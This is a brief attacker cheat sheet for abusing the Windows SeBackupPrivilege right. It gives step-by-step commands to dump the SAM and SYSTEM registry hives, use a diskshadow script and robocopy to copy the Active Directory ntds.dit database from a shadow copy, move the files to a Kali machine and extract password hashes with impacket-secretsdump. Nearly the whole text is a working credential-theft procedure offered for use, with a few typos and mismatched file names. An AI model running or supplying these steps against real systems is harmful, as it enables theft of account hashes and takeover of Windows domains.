When the user is part of SeBackupPrivilege we can use below options to escalate the privilages. 

Option 1) Download the SYSTEM and SAM filed 
  1) reg save hklm\sam c:\temp\sam.bak
  2) reg save hklm\system c:\temp\system.bak
  3) Download the files to kali system
  4) Use Impacket to tool to extract the hash from the files.
      impacket-secretsdump -sam sam -system system LOCAL



Option 2) We follow below steps to get ntds file and we can extract the hash

Step 1) Save the below script as backup.txt  in the kali and move it to the victim machine. (make sure we have temp folder or create it) 
set verbose onX
set metadata C:\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX

Step 2) Run the command "diskshadow /s backup.txt"
Note:- The script creates E drive and copy all the files from C drive to this E drive. 

Step 3) Run the coammnd to copy the ntds file "robocopy /b E:\Windows\ntds . ntds.dit"

Step 4) Sace the system file "reg save hklm\system c:\temp\system.bak"

Step 5) Download the ntds file and system files to kali 
Note :- Use full path to download the file ( e.g. download c:\temp\ntds.dit /root/Downloads/ntds.dit)

Step 6) Run the Impacket to extract the hashes
impacket-secretsdump -ntds ntds.dit -system system LOCAL
